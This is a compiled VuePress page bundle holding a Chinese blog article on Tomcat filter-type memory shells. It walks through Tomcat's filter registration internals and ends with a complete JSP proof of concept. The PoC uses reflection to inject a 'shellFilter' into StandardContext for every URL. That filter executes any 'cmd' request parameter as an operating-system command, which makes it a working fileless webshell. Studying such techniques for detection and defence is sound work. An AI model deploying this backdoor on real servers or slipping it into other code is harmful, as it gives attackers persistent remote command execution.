import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as n,a,o as e}from"./app-DS0ZCcmM.js";const l={};function t(p,s){return e(),n("div",null,s[0]||(s[0]=[a(`<h1 id="filter" tabindex="-1"><a class="header-anchor" href="#filter"><span>Filter</span></a></h1><p>在Tomcat架构中Filter在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式</p><p>使用 ServletContext 的 addFilter/createFilter 方法注册；</p><p>使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册；</p><p>使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态）</p><ul><li><p>ServletContext 的 addFilter/createFilter 注册</p><p><strong>ServletContext#creatFilter</strong></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;T extends Filter&gt; T createFilter(Class&lt;T&gt; var1) throws ServletException</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这个类还约定了一个事情，那就是如果这个 ServletContext 传递给 ServletContextListener 的 ServletContextListener.contextInitialized 方法，该方法既未在 web.xml 或 web-fragment.xml 中声明，也未使用 javax.servlet.annotation.WebListener 进行注释，则会抛出 UnsupportedOperationException 异常</p><p><strong>ApplicationContext#addFilter()</strong></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/屏幕截图 2024-06-28 141113.png" alt="屏幕截图 2024-06-28 141113" tabindex="0" loading="lazy"><figcaption>屏幕截图 2024-06-28 141113</figcaption></figure><p>该方法创建了一个FilterDef对象，将fiterName,filterClass,filter对象初始化进去，使用 StandardContext 的 <code>addFilterDef</code> 方法将创建的 FilterDef 储存在了 StandardContext 中的一个 Hashmap filterDefs 中，然后 new 了一个 ApplicationFilterRegistration 对象并且返回</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628143033976.png" alt="image-20240628143033976" tabindex="0" loading="lazy"><figcaption>image-20240628143033976</figcaption></figure><p>需要注意的是，这个方法并没有将这个Filter放入到FilterChain中，单纯调用这个方法不会完成自定义 Filter 的注册。并且这个方法判断了一个状态标记，如果程序以及处于运行状态中，则不能添加 Filter。</p><p><strong>Tomcat如何处理一次filterchain请求</strong></p><p>我们可以先实现一个恶意的filter进行调试</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628144641398.png" alt="image-20240628144641398" tabindex="0" loading="lazy"><figcaption>image-20240628144641398</figcaption></figure><p><strong>ApplicationFilterChian#internalDoFilter()</strong></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628150352284.png" alt="image-20240628150352284" tabindex="0" loading="lazy"><figcaption>image-20240628150352284</figcaption></figure><p>调用filter.Filter(),filter来自</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Filter</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> filter </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> filterConfig</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">--</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">    ApplicationFilterConfig</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> filterConfig </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">filters</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pos</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">++</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">]</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>filterConfig来自于一个filters数组，跟进到该数组赋值的位置</p><p><strong>StandardWrapperValue#invoke</strong></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628152359316.png" alt="image-20240628152359316" tabindex="0" loading="lazy"><figcaption>image-20240628152359316</figcaption></figure><p>调用了ApplicationFilterFactory#creatFilterChain方法</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628153200124.png" alt="image-20240628153200124" tabindex="0" loading="lazy"><figcaption>image-20240628153200124</figcaption></figure><p>这个函数流程如下</p><ul><li>在context中获取 filterMaps，并遍历匹配 url 地址和请求是否匹配</li><li>在context 中根据 filterMaps 中的 filterName 查找对应的 filterConfig</li><li>获取到 filterConfig，则将其加入到 filterChain 中</li><li>继续循环，直至添加所有匹配的filter</li></ul><p>根据上述流程，我们知道要动态注册一个filter我们需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig</p><p>在ApplicationFilter#addfilter()中，将初始化的filter放入StandardContext的filterDefs中，来看下另外两个参数是如何生成并添加的</p><p><strong>StandardContext#filterStart()</strong></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/屏幕截图 2024-06-28 213052.png" alt="屏幕截图 2024-06-28 213052" tabindex="0" loading="lazy"><figcaption>屏幕截图 2024-06-28 213052</figcaption></figure><p><strong>ApplicationFilterRegistration#addMappingForUrlPatterns()</strong></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628213910446.png" alt="image-20240628213910446" tabindex="0" loading="lazy"><figcaption>image-20240628213910446</figcaption></figure><p>如图添加了filtermap</p><p>至此我们的思路是</p><ul><li>获取StandardContext对象</li><li>创建恶意Filter</li><li>使用FilterDef对Filter进行封装，并添加必要的属性</li><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ul><p>首先获取当前环境中StandardContext的上下文，封装在ApplicationContext方法中</p><p>通过jsp自带的request方法获取到ApplicationContextFaced类，再通过反射获取到封装的StandardContext</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //获取ApplicationContextFaced类</span></span>
<span class="line"><span>    ServletContext servletContext = request.getSession().getServletContext();</span></span>
<span class="line"><span>    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象</span></span>
<span class="line"><span>    Field appContext = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    appContext.setAccessible(true);</span></span>
<span class="line"><span>    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span></span>
<span class="line"><span>    //获取StandardContext</span></span>
<span class="line"><span>    Field stdContext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    stdContext.setAccessible(true);</span></span>
<span class="line"><span>    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>创建一个恶意filter</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%!</span></span>
<span class="line"><span>    public class TestFilter implements Filter {</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {</span></span>
<span class="line"><span>            String cmd = servletRequest.getParameter(&quot;cmd&quot;);</span></span>
<span class="line"><span>            if(cmd != null ){</span></span>
<span class="line"><span>                try {</span></span>
<span class="line"><span>                    Runtime.getRuntime().exec(cmd);</span></span>
<span class="line"><span>                } catch (IOException e) {</span></span>
<span class="line"><span>                    e.printStackTrace();</span></span>
<span class="line"><span>                } catch (NullPointerException n) {</span></span>
<span class="line"><span>                    n.printStackTrace();</span></span>
<span class="line"><span>                }</span></span>
<span class="line"><span>            }</span></span>
<span class="line"><span>            filterChain.doFilter(servletRequest, servletResponse);</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>封装filterDef</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%</span></span>
<span class="line"><span>    shellFilter shellFilter = new shellFilter();</span></span>
<span class="line"><span>    String name = &quot;shellfilter&quot;;</span></span>
<span class="line"><span>    FilterDef filterDef = new FilterDef();</span></span>
<span class="line"><span>    filterDef.setFilter(shellFilter);</span></span>
<span class="line"><span>    filterDef.setFilterName(name);</span></span>
<span class="line"><span>    filterDef.setFilterClass(String.valueOf(shellFilter.getClass()));</span></span>
<span class="line"><span>    standardContext.addFilterDef(filterDef);</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>创建filtermap</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">    FilterMap</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> filterMap  </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> FilterMap</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">()</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    filterMap</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setFilterName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(name);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    filterMap</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addURLPattern</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/*&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    filterMap</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setDispatcher</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DispatcherType</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">REQUEST</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">());</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    standardContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addFilterMap</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(filterMap);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>获取filterConfigs并将filterDef添加</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">    Field</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> fieldconfigs </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> standardContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getClass</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getDeclaredField</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;filterConfigs&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    fieldconfigs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setAccessible</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">    Map</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> filterConfigs </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (Map) </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">fieldconfigs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(standardContext);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        //获取构造函数</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">    Constructor</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> constructor </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> ApplicationFilterConfig</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">class</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getDeclaredConstructor</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">Context</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">class</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">FilterDef</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">class</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    constructor</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setAccessible</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">    ApplicationFilterConfig</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> filterconfig </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (ApplicationFilterConfig) </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">constructor</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">newInstance</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(standardContext,filterDef);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    filterConfigs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">put</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(name,filterconfig);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>完整poc</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%--</span></span>
<span class="line"><span>  Created by IntelliJ IDEA.</span></span>
<span class="line"><span>  User: uu2fu3o</span></span>
<span class="line"><span>  Date: 2024/6/28</span></span>
<span class="line"><span>  Time: 22:08</span></span>
<span class="line"><span>  To change this template use File | Settings | File Templates.</span></span>
<span class="line"><span>--%&gt;</span></span>
<span class="line"><span>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.util.Map&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //获取ApplicationContextFaced类</span></span>
<span class="line"><span>    ServletContext servletContext = request.getSession().getServletContext();</span></span>
<span class="line"><span>    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象</span></span>
<span class="line"><span>    Field appContext = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    appContext.setAccessible(true);</span></span>
<span class="line"><span>    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span></span>
<span class="line"><span>    //获取StandardContext</span></span>
<span class="line"><span>    Field stdContext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    stdContext.setAccessible(true);</span></span>
<span class="line"><span>    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span>&lt;%!</span></span>
<span class="line"><span>    public class shellFilter implements Filter {</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {</span></span>
<span class="line"><span>            String cmd = servletRequest.getParameter(&quot;cmd&quot;);</span></span>
<span class="line"><span>            if(cmd != null ){</span></span>
<span class="line"><span>                try {</span></span>
<span class="line"><span>                    Runtime.getRuntime().exec(cmd);</span></span>
<span class="line"><span>                } catch (IOException e) {</span></span>
<span class="line"><span>                    e.printStackTrace();</span></span>
<span class="line"><span>                } catch (NullPointerException n) {</span></span>
<span class="line"><span>                    n.printStackTrace();</span></span>
<span class="line"><span>                }</span></span>
<span class="line"><span>            }</span></span>
<span class="line"><span>            filterChain.doFilter(servletRequest, servletResponse);</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    shellFilter shellFilter = new shellFilter();</span></span>
<span class="line"><span>    String name = &quot;shellfilter&quot;;</span></span>
<span class="line"><span>    FilterDef filterDef = new FilterDef();</span></span>
<span class="line"><span>    filterDef.setFilter(shellFilter);</span></span>
<span class="line"><span>    filterDef.setFilterName(name);</span></span>
<span class="line"><span>    filterDef.setFilterClass(String.valueOf(shellFilter.getClass()));</span></span>
<span class="line"><span>    standardContext.addFilterDef(filterDef);</span></span>
<span class="line"><span>    //创建filtermap</span></span>
<span class="line"><span>    FilterMap filterMap  = new FilterMap();</span></span>
<span class="line"><span>    filterMap.setFilterName(name);</span></span>
<span class="line"><span>    filterMap.addURLPattern(&quot;/*&quot;);</span></span>
<span class="line"><span>    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span></span>
<span class="line"><span>    //直接添加在最前</span></span>
<span class="line"><span>    standardContext.addFilterMapBefore(filterMap);</span></span>
<span class="line"><span>    //使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</span></span>
<span class="line"><span>    Field fieldconfigs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span></span>
<span class="line"><span>    fieldconfigs.setAccessible(true);</span></span>
<span class="line"><span>    Map filterConfigs = (Map) fieldconfigs.get(standardContext);</span></span>
<span class="line"><span>        //获取构造函数</span></span>
<span class="line"><span>    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span></span>
<span class="line"><span>    constructor.setAccessible(true);</span></span>
<span class="line"><span>    ApplicationFilterConfig filterconfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    filterConfigs.put(name,filterconfig);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628233938672.png" alt="image-20240628233938672" tabindex="0" loading="lazy"><figcaption>image-20240628233938672</figcaption></figure><p>效果如图</p></li></ul>`,6)]))}const c=i(l,[["render",t],["__file","Filter.html.vue"]]),h=JSON.parse('{"path":"/Java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat/Filter.html","title":"Filter","lang":"zh-CN","frontmatter":{"description":"Filter 在Tomcat架构中Filter在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式 使用 ServletContext 的 addFilter/createFilter 方法注册； 使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册； 使用 Servlet...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/Java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat/Filter.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"Filter"}],["meta",{"property":"og:description","content":"Filter 在Tomcat架构中Filter在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式 使用 ServletContext 的 addFilter/createFilter 方法注册； 使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册； 使用 Servlet..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-28%20141113.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Filter\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-28%20141113.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628143033976.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628144641398.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-2024062815035228